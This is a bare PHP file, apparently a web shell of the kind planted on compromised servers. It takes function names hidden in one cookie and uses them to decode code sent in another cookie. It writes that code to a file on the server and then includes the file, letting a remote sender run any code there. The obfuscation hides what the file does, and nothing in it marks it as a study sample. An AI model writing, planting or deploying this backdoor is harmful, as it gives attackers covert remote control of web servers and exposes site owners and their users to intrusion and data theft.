<?php
if (isset($_COOKIE[3]) && isset($_COOKIE[35])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 4;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[35][$n];
        if (!$c[35][$n + 1]) {
            if (!$c[35][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 4 + 1;
    }
    $k = $p[16]() . $p[28];
    if (!$p[26]($k)) {
        $n = $p[18]($k, $p[8]);
        $p[10]($n, $p[15] . $p[14]($p[11]($c[3])));
    }
    include($k);
}